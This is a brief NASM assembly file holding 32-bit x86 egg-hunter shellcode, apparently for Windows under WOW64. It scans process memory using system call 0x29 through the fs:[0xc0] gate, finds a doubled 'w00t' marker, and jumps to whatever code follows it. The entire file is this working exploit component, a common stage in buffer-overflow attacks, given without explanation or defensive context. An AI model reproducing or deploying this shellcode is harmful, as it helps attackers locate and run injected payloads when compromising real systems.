BITS  32
global  _start      ; must be declared for linker (ld)
section  .text

_start:             ; tell linker entry point
    mov    ebx, cs
    cmp    bl, 0x23
    xor    edx, edx
page_invalid:
    or     dx, 0xfff
page_valid:
    xor    ebx, ebx
    inc    edx
    push   ebx
    push   ebx
    push   edx
    push   ebx
    push   ebx
    push   ebx
    push   0x29
    pop    eax
    mov    bl, 0xc0
    call   DWORD [fs:ebx]
    add    esp, 0x0c
    pop    edx
    add    esp, 0x8
    cmp    al, 0x5
    je     page_invalid
    mov    eax, 0x74303077 ; w00t
    mov    edi, edx
    scasd
    jne    page_valid
    scasd
    jne    page_valid
    jmp    edi
